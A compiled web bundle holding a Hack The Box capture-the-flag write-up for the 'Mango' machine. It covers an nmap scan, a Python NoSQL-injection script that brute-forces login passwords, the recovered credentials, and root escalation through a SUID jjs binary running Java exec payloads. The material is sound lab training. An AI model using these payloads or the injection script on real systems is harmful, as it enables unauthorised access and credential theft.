"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9083],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>d});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var p=a.createContext({}),s=function(e){var t=a.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=s(e.components);return a.createElement(p.Provider,{value:t},e.children)},m="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,p=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),m=s(n),h=r,d=m["".concat(p,".").concat(h)]||m[h]||c[h]||o;return n?a.createElement(d,i(i({ref:t},u),{},{components:n})):a.createElement(d,i({ref:t},u))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=h;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l[m]="string"==typeof e?e:r,i[1]=l;for(var s=2;s<o;s++)i[s]=n[s];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},29201:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>i,default:()=>c,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var a=n(87462),r=(n(67294),n(3905));const o={layout:"post",title:"Mango ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb"],date:"2020/04/18",thumbnail:"/img/HackTheBox/mango.png",toc:!0},i=void 0,l={unversionedId:"HackTheBox/Mango/write-up",id:"HackTheBox/Mango/write-up",title:"Mango ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Mango/write-up.md",sourceDirName:"HackTheBox/Mango",slug:"/HackTheBox/Mango/write-up",permalink:"/writeups/HackTheBox/Mango/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"web",permalink:"/writeups/tags/web"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"}],version:"current",frontMatter:{layout:"post",title:"Mango ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb"],date:"2020/04/18",thumbnail:"/img/HackTheBox/mango.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Magic ",permalink:"/writeups/HackTheBox/Magic/write-up"},next:{title:"Monteverde ",permalink:"/writeups/HackTheBox/Monteverde/write-up"}},p={},s=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network enumeration",id:"network-enumeration",level:3},{value:"Webapp discovery",id:"webapp-discovery",level:3},{value:"Webapp exploitation",id:"webapp-exploitation",level:3},{value:"System enumeration",id:"system-enumeration",level:3},{value:"System Privilege Escalation of Machine",id:"system-privilege-escalation-of-machine",level:3}],u={toc:s},m="wrapper";function c(e){let{components:t,...o}=e;return(0,r.kt)(m,(0,a.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,r.kt)("h1",{id:""}),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Mango"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/214"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"mango",src:n(51500).Z,width:"598",height:"381"})),(0,r.kt)("h1",{id:"-1"}),(0,r.kt)("h3",{id:"overview"},"Overview"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Network enumeration"),": 22, 80, 443"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Webapp discovery"),": SSL cert leaks subdomain in CN"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Webapp exploitation"),": mango -> mongDB -> noSQLi"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"System enumeration"),": jjs history"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"System Privilege Escalation of Machine "),": jjs SUID")),(0,r.kt)("h3",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": 22, 80, 443"),(0,r.kt)("p",null,"This time I launched a full scan with ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),": ",(0,r.kt)("inlineCode",{parentName:"p"},"nmap -A -oA nmap_full 10.10.10.162"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Thu Mar 26 23:50:11 2020 as: nmap -A -oA nmap_full 10.10.10.162\nNmap scan report for 10.10.10.162\nHost is up (0.031s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)\n|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)\n|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: 403 Forbidden\n443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Mango | Search Base\n| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN\n| Not valid before: 2019-09-27T14:21:19\n|_Not valid after:  2020-09-26T14:21:19\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=31997%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31B\nOS:F%P=x86_64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A\nOS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54\nOS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120\nOS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\nOS:0%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT      ADDRESS\n1   33.10 ms 10.10.14.1\n2   33.13 ms 10.10.10.162\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Mar 26 23:50:39 2020 -- 1 IP address (1 host up) scanned in 28.40 seconds\n")),(0,r.kt)("p",null,"As for many boxes, we have only a web application and a SSH server."),(0,r.kt)("h3",{id:"webapp-discovery"},"Webapp discovery"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": SSL cert leaks subdomain in CN"),(0,r.kt)("p",null,"When we try to reach the port 80 (",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.162"},"http://10.10.10.162"),") we are denied."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/5ZasjJy.png",alt:null})),(0,r.kt)("p",null,"On port 443 (",(0,r.kt)("a",{parentName:"p",href:"https://10.10.10.162"},"https://10.10.10.162"),") there is a search engine, but after a few\nminutes enumerating and fuzzing manually I concluded this was a rabbit hole."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/5Qu3jlT.png",alt:null})),(0,r.kt)("p",null,"If you look carefully at the ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," results, one of the scripts discloses us a\nsubdomain."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN\n")),(0,r.kt)("p",null,"It is also possible to find it with ",(0,r.kt)("inlineCode",{parentName:"p"},"openssl"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ openssl s_client -connect 10.10.10.162:443\n...\nissuer=C = IN, ST = None, L = None, O = Mango Prv Ltd., OU = None, CN = staging-order.mango.htb, emailAddress = admin@mango.htb\n")),(0,r.kt)("p",null,"So I set the IP matching ",(0,r.kt)("inlineCode",{parentName:"p"},"staging-order.mango.htb")," in ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"10.10.10.162 staging-order.mango.htb\n")),(0,r.kt)("p",null,"And when returning on port 80 (",(0,r.kt)("a",{parentName:"p",href:"http://staging-order.mango.htb/"},"http://staging-order.mango.htb/"),") we are no longer\ndenied."),(0,r.kt)("p",null,"This is a login page with a form:"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/syrLOxL.jpg",alt:null})),(0,r.kt)("h3",{id:"webapp-exploitation"},"Webapp exploitation"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": mango -> mongDB -> noSQLi"),(0,r.kt)("p",null,"Here a small guessing step is required."),(0,r.kt)("p",null,"The name of the box is ",(0,r.kt)("em",{parentName:"p"},"mango"),", a popular NoSQL database is MongoDB, so it is\nsuggesting that we have to exploit a NoSQLi, definitely on the auth form."),(0,r.kt)("p",null,"For people who never exploited a NoSQLi vulnerability before, you can find\nsome payload on ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"},"PayloadsAllTheThings"),". I contributed several time\nto the ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/commits/master/NoSQL%20Injection"},"NoSQLi page")," so I know the payload that are here."),(0,r.kt)("p",null,"I adapted one script to bruteforce the password of a given account."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername=\"mango\"\npassword=\"\"\nu=\"http://staging-order.mango.htb/\"\nheaders={'content-type': 'application/x-www-form-urlencoded'}\n\nwhile True:\n    for c in string.printable:\n        if c not in ['*','+','.','?','|','&','$']:\n            payload='username=%s&password[$regex]=^%s&login=login' % (username, password + c)\n            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\n            if 'Log in for ordering Sweet & Juicy Mango.' not in r.text or r.status_code == 302:\n                print(\"Found one more char : %s\" % (password+c))\n                password += c\n")),(0,r.kt)("p",null,"Let's run it for ",(0,r.kt)("inlineCode",{parentName:"p"},"admin")," user:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ python bf.py\nFound one more char : t\nFound one more char : t9\nFound one more char : t9K\nFound one more char : t9Kc\nFound one more char : t9KcS\nFound one more char : t9KcS3\nFound one more char : t9KcS3>\nFound one more char : t9KcS3>!\nFound one more char : t9KcS3>!0\nFound one more char : t9KcS3>!0B\nFound one more char : t9KcS3>!0B#\nFound one more char : t9KcS3>!0B#2\n")),(0,r.kt)("p",null,"We can also run it for ",(0,r.kt)("inlineCode",{parentName:"p"},"mango"),"."),(0,r.kt)("p",null,"Finally we have 2 accounts:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"admin")," / ",(0,r.kt)("inlineCode",{parentName:"li"},"t9KcS3>!0B#2")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"mango")," / ",(0,r.kt)("inlineCode",{parentName:"li"},"h3mXK8RhU~f{]f5H"))),(0,r.kt)("p",null,"There is even a guy that made a small\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration"},"script / tool"),"\naround this so you don't have to change your script each time."),(0,r.kt)("p",null,"If you try to login with a accounts you will get this message:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},"<h1>Under Plantation</h1>\n<h2>Sorry for the inconvenience. We just started farming!</h2>\n<h3>To contact us in the meantime please email: admin@mango.htb<br />\nWe rarely look at our inboxes.</h3>\n")),(0,r.kt)("h3",{id:"system-enumeration"},"System enumeration"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": jjs history"),(0,r.kt)("p",null,"It seems there is not more stuff to do on teh webapp."),(0,r.kt)("p",null,"But we can use the credentials to connect via ssh."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh mango@10.10.10.162\n\nmango@mango:~$ ls -lhA /home/admin/\ntotal 40K\nlrwxrwxrwx 1 admin admin    9 Sep 27 14:30 .bash_history -> /dev/null\n-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 admin admin 3.7K Apr  4  2018 .bashrc\n-rw-rw-r-- 1 root  admin  481 Mar 27 16:53 .jjs.history\n-rw-rw-r-- 1 admin admin  227 Mar 27 16:53 js\ndrwxrwxr-x 3 admin admin 4.0K Mar 27 16:27 .local\n-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile\n-rw-rw-r-- 1 admin admin 8.5K Mar 27 16:31 test.py\n-r-------- 1 admin admin   33 Sep 27 14:29 user.txt\n\nmango@mango:~$ su admin\nPassword:\n$ id\nuid=4000000000(admin) gid=1001(admin) groups=1001(admin)\n$ cd\n$ cat user.txt\n79bf31c6c6eb38a8567832f7f8b47e92\n")),(0,r.kt)("p",null,"We found the user flag we also saw there is a ",(0,r.kt)("inlineCode",{parentName:"p"},".jjs.history")," file."),(0,r.kt)("h3",{id:"system-privilege-escalation-of-machine"},"System Privilege Escalation of Machine"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": jjs SUID"),(0,r.kt)("p",null,"So let's find where is the ",(0,r.kt)("inlineCode",{parentName:"p"},"jjs")," binary on the file system."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"admin@mango:/home/admin$ ls -lh $(which jjs)\nlrwxrwxrwx 1 root root 21 Sep 27 14:15 /usr/bin/jjs -> /etc/alternatives/jjs\nadmin@mango:/home/admin$ ls -lh /etc/alternatives/jjs\nlrwxrwxrwx 1 root root 42 Sep 27 14:15 /etc/alternatives/jjs -> /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs\nadmin@mango:/home/admin$ ls -lh /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs\n-rwsr-sr-- 1 root admin 11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs\n")),(0,r.kt)("p",null,"We can see there is a SUID bit on the binary."),(0,r.kt)("p",null,"As each time we want to do an pe on Linux, let's check ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"GTFOBins"),"\nfirst. There is a page for ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/jjs/#suid"},"jjs"),"."),(0,r.kt)("p",null,"So using the SUID pe payload we found on ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"GTFOBins"),", we can elevate\nour privileges to root, and use this to read the root flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ echo \"Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs\n$ echo \"Java.type('java.lang.Runtime').getRuntime().exec('chmod g+rw /tmp/.cyfun/cyfun.txt').waitFor()\" | jjs\n$ cat /tmp/.cyfun/cyfun.txt\n8a8ef79a7a2fbb01ea81688424e9ab15\n")))}c.isMDXComponent=!0},51500:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/mango-94b26ce00640da456468cfae486f2087.png"}}]);